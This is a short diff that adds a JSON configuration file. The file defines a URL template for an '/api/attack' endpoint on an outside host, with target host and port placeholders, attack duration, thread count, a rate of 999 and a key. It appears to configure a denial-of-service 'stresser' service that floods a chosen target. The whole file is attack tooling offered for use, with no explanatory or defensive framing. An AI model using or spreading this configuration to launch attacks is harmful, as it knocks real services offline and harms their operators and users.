@@ -1,0 +1,9 @@
+{
+    "METHODS": "/api/attack?key=negan&time=200&method=attack&port={port}&modul=FULL&threads=4&rate=999&host={host};",
+    "requests": [
+        {
+            "id": 1,
+            "url": "https://123apipro.zeabur.app/"
+        }
+    ]
+}
